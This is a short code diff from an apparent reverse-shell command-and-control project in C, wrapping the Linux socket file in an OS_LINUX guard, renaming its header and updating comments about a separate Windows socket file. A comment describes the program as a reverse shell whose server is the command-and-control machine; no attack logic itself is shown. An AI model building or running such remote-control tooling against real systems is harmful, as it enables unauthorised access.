@@ -1,17 +1,19 @@
+#ifdef OS_LINUX
+
 #include <stdio.h>
 #include <sys/socket.h> //unix-specific...
 #include <netdb.h> //for little to big endian
 #include <stdlib.h>
-#include <string.h>
+#include <string.h> //slated for removal? only used in client-side code
 #include <arpa/inet.h> //for inet_pton()
 #include <unistd.h>
 
-#include "socket.h"
+#include "linux_socket.h"
 #include "commands.h"
 #include "definitions.h"
 #include "externs.h"
 
-//TODO - get windows sockets working :(
+//windows sockets - win32_socket.c
 
 /* As this application is a reverse shell style program, the server is the 
 * command and control machine that gets connected back to.
@@ -126,3 +128,7 @@ int startClient(void)
 	free(msg);
 	return 0;
 }
+
+
+#endif
+//Corresponds to #ifdef OS_Linux
